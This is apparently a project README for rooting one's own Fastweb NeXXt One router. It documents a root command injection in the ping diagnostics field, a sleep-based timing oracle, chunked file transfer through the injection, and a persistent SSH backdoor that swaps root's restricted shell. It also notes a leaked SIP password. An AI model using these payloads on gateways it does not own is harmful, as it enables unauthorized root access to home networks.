# NeXXt One (FGA221D / GDNT-S) — Root & Diagnostics Guide

> **Audience:** owners of a Fastweb NeXXt One who want full control of their
> own gateway. Everything here was verified on firmware
> `22.2.0378_FW_058_FGA221D` (web assets timestamped `20260515082010`).
> All tools are original work in this repository — no community exploit code.

**Contents:** 1 Device facts · 2 Web session & login · 3 Command injection ·
4 Timing oracle · 5 Reliable file transfer · 6 Persistent SSH · 7 Firewall
truths & pinholes · 8 Troubleshooting · 9 FAQ · 10 Recovery & safety

---

## 0. Safety model (read first)

Legal/safe usage boundaries this project follows:

- Work only on your own gateway, on your own LAN.
- Never flash firmware, change boot banks, change the root password, or touch
  TR-069 (cwmp). Those are the actions that can actually brick the device or
  break the ISP relationship.
- Everything uploaded to the router is data generated locally (your SSH key,
  small shell commands). No third-party binaries.
- Keep a way back: back up before edits, prefer runtime-only changes, and use
  the persistent SSH service (not the injection) for anything risky.

## 1. Device facts

| Item | Value |
|---|---|
| Product | Fastweb NeXXt One (`FGA221DFWB`) |
| Board | `GDNT-S` (Technicolor/Vantiva Homeware) |
| SoC/OS | armv7l, OpenWrt-based, Linux 4.19 |
| Firmware | `22.2.0378_FW_058_FGA221D` (FW_056…058 share the web stack) |
| Web UI | `https://192.168.1.254`, nginx, self-signed cert |
| SSH/telnet | closed by default (22/23 refused) |
| dropbear | 2019.x — **no `-R`, no `-E`, no ed25519/ecdsa keys** |

Useful `nvget` services (read-only): `sysinfo`, `wanstatusinfo`, `lan_status`,
`lanipv6details`, `laninfo`, `firewall_conf`, `dmz_conf`,
`virtual_server_list`, `upnp_conf`, `pingstatusinfo`.
Note: `statusinfo` returns 404 on this firmware.

## 2. Web session & login

- There is **no password login**. Login = pressing **both side buttons for
  3 seconds within a 20-second window** (UI string `LOGIN.INFO`).
- All API calls are `GET /status.cgi`:
  - read: `?nvget=<service>&_=<ms>`
  - write: `?act=nvset&service=<service>&<params>&_=<ms>`
- Session credential: `sessionID` cookie (HttpOnly).
- Button-login handshake (what the UI does):
  1. `act=nvset&service=login_confirm&cmd=7&loginPath=2` (arm the window)
  2. poll `nvget=login_confirm&cmd=7` → `loginPath:"1"` = button detected
  3. `act=nvset&service=login_confirm&cmd=7&loginPath=1` (state reset; a `"0"`
     reply is normal)
  4. `nvget=login_confirm&cmd=4` → `login_status:"1"` when authenticated
- **Root cause of scripted-login failure (solved):** the confirm step only
  authenticates the session that was **created most recently**
  (`sessionmgr.lua:newSession` records each new session in
  `uci.fastweb.sessions.@sessions.sessionid`; `login.wat` compares it with the
  caller's session). If anyone (e.g. a browser tab) created a session after
  yours, the confirm silently does nothing. Fix: clear the local cookie jar,
  request `/login` once to mint a fresh session, and don't open the router
  page in a browser during login. `nexxt session login` does this
  automatically.
- **Fallback:** log in once in a real browser, then
  `nexxt session import-cookie <sessionID|capture.har>`. The session stays
  valid until the browser logs out.

## 3. Command injection (verified on FW_058)

- Endpoint: `act=nvset&service=pingstatus&host=<PAYLOAD>&state=Requested&name=ping`
- Payload shape: `host = :::::::;<shell command>`
  (`:::::::` passes the front-end's unanchored IPv6 regex; the backend splices
  the host into a shell command line running **as root**.)
- Use `${IFS}` instead of spaces (the command is URL-encoded by the client and
  decoded server-side before hitting the shell).
- **The backend strips `>` characters.** All redirections (`>`, `>>`, `2>&1`)
  break. Write files with `| tee <path>` (verified). You cannot merge stderr
  into stdout — design commands that don't need it.
- **Content filter:** some host strings are silently dropped (command never
  runs), reproducibly for the same string. Workaround: segment + bisect, see §5.
- Result polling: `nvget=pingstatusinfo` — `DiagnosticsState` moves from
  `Requested` to `Complete`/`Error_*`. Injected strings usually yield
  `Error_CannotResolveHostName` even though the command ran.
- `pingstatusinfo.IPv4` echoes the raw host parameter verbatim (pre-expansion)
  — handy to confirm what the server actually received.
- **Injected commands run in a sandboxed network namespace**: ping/curl/wget
  to LAN hosts, loopback HTTP, `nc -l` listeners — all fail. There is **no
  network output channel**. But the filesystem and ubus are real, so
  `uci` + `/etc/init.d/*` let procd start services in the main namespace
  (that is how the SSH service is started).

## 4. Timing oracle (boolean readout without stdout)

```
host = :::::::;<condition> && sleep${IFS}8
```

Total wall time of the request ≈ baseline (~2.3 s) + 8 s ⇒ condition true.
Measure the baseline first with `host=127.0.0.1`. Proven patterns:
`test -f`, `grep -q`, `wc -c <f> | grep -q '^393'`, `md5sum <f> | grep -q <hash>`,
`netstat -tln | grep -q :2222`, `test $(id -u) -eq 0`.

## 5. Reliable file transfer (unified CLI: `nexxt transfer`)

1. base64 → URL-safe alphabet (`+`→`-`, `/`→`_`).
2. Split into ≤48-char segments; each goes to its own idempotent file
   (`printf %s <seg> | tee /tmp/nxseg_<tag>_NNN`).
3. Verify each segment with a single oracle round-trip: `grep -qFx <seg> <file>`
   (the file has no trailing newline, so an exact full-line match proves both
   content and length). Retry, then bisect on persistent failure
   (`NNN`→`NNNa`/`NNNb`; glob lexical order stays correct).
4. Assemble: `cat <parts> | tr '_-' '/+' | base64 -d | tee <target>`.
   - busybox `tr` treats a leading `-` as an option: use `tr '_-' '/+'`.
   - Keep each injected command short (~<200 chars); assemble in groups.
5. Verify end-to-end with an md5 oracle.
6. Execution is **asynchronous and can be reordered/late**: a failed write may
   land later and clobber a newer correct file (observed). Re-audit after
   transferring.

## 6. Persistent SSH (unified CLI: `nexxt ssh`)

What `bootstrap` does (all reversible):

1. Stores the original root account line under `/etc/nexxt-toolkit/` with
   mode 0600, then patches the shell from `/bin/restricted_shell` to
   `/bin/ash`. The rollback record survives reboot.
2. Transfers your **RSA** public key with end-to-end verification, records the
   exact line it owns, and appends it to both authorized-key files. Existing
   keys are never overwritten.
3. Creates a UCI dropbear instance: `enable=1`, `Port=2222`, `Interface=lan`,
   `PasswordAuth=off`, `RootPasswordAuth=off`; commits and
   `/etc/init.d/dropbear restart`.

Why procd and not a direct `dropbear` call: manually spawned processes are
either killed by the CGI cleanup or live in the sandboxed namespace. Only
procd-managed services are reachable.

Persistence: UCI commit (flash) + the dropbear init script is enabled at boot
+ firmware host key in `/etc/dropbear/` + keys on the persistent overlay.
The instance survives reboots. Do **not** touch the ISP's own `dropbear.wan`
management instance.

Connect (modern OpenSSH needs legacy algorithms re-enabled):

```bash
ssh -i <key> -p 2222 \
  -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa \
  root@192.168.1.254
```

`teardown` removes the instance, removes only the recorded toolkit key, and
restores the exact root account line captured before installation. A legacy
installation created by v1.4.0 or older has no ownership record; migrate it
once with `ssh bootstrap ... --adopt-legacy`. Without that explicit consent,
the toolkit refuses destructive cleanup or adoption.

## 7. Firewall truths & pinholes

- The API's `firewall_conf enabled=0` is **misleading**: fw3 was running all
  along with `INPUT`/`FORWARD` policy DROP and
  `firewall.fwconfig.level='normal'` (rule groups
  `normalrules/laxrules/highrules/userrules`). Inbound IPv6 died in
  `zone_wan_forward`'s default drop — not because "the firewall is off".
- The safe pattern is **keep the firewall on** and add one precise persistent
  rule, e.g. for an AmneziaWG/WireGuard server at `<SERVER_V6>`:

  ```
  uci add firewall rule
  uci set firewall.@rule[-1].name='Allow-AWG-server-v6'
  uci set firewall.@rule[-1].src='wan'
  uci set firewall.@rule[-1].dest='lan'
  uci set firewall.@rule[-1].proto='udp'
  uci set firewall.@rule[-1].family='ipv6'
  uci set firewall.@rule[-1].dest_ip='<SERVER_V6>/128'
  uci set firewall.@rule[-1].dest_port='51820'
  uci set firewall.@rule[-1].target='ACCEPT'
  uci commit firewall && /etc/init.d/firewall restart
  ```

  It lands in `zone_wan_forward` and survives reboots and firewall reloads.

Prefer `nexxt fw ensure` to raw UCI: it creates or updates one named rule
idempotently, backs up the firewall package, reloads it, and restores the
backup if the operation fails. `nexxt fw audit` reports duplicate names,
broad WAN accepts, and enabled UCI rules absent from the running tables.

To test real inbound reachability, run `nexxt inbound observe --rule NAME
--key KEY` and start a **new** external connection during the window. A
positive packet delta proves arrival at the gateway. Zero is deliberately
reported as inconclusive: client inactivity, hardware offload and upstream
filtering can all produce it. A private WAN address by itself does not prove
CGNAT blocking; an ISP may provide upstream 1:1 NAT.

## 8. Troubleshooting

| Symptom | Cause / fix |
|---|---|
| `login_status` stays 0 after button press | Browser-context binding; use HAR cookie import instead |
| Injected command "does nothing" | `>` stripped (use `tee`), or content filter (bisect), or sandboxed netns (no network possible) |
| Long request silently ignored | Host-string length/content limit — split the payload |
| dropbear starts but key rejected | ed25519 unsupported (use RSA), file must be newline-terminated, `/bin/restricted_shell` blocks login |
| `not-observed` from inbound observer | Inconclusive; create a new external flow and inspect offload/upstream state |
| Existing SSH changes have no ownership record | Use `--adopt-legacy` only for a confirmed toolkit <=1.4.0 install; otherwise leave them untouched |
| File content wrong after transfer | Late/arbitrary re-execution clobbered it — re-audit segments and re-write the bad ones |

## 9. FAQ

- **Does this need physical access?** Yes — the session requires pressing the
  device buttons (or reusing a session created that way).
- **Can this brick the gateway?** The described steps don't touch flash layout,
  firmware images, boot banks or TR-069. `teardown` restores the shell.
- **Does it survive a firmware update?** Assume no. Run `nexxt audit-update
  --key KEY`; it records the firmware fingerprint and checks SSH policy,
  persistent rollback state and firewall runtime.
- **ISP's own dropbear (`dropbear.wan`)?** Leave it alone; it's restricted to
  an ISP subnet with 2FA.

## 10. Recovery & safety

- Preferred recovery: `./nexxt ssh teardown`; it uses the persistent ownership
  record and preserves unrelated keys and account changes.
- Do not use `--legacy-force` unless you have confirmed a <=1.4.0 toolkit
  installation and accept its old whole-file key cleanup behavior.
- `/tmp` artifacts vanish on reboot; to wipe now: `rm -f /tmp/nx* /tmp/k*.b64`.
- Browser HAR files contain the `sessionID` and possibly VoIP credentials
  (`deviceinfo` leaks a base64 SIP password) — delete them after use.
- Before opening a public issue, create `nexxt support-bundle`; it only admits
  safe firmware fields and redacts cookies, credentials, MACs, serials and raw
  IP addresses. Review the report before uploading it.
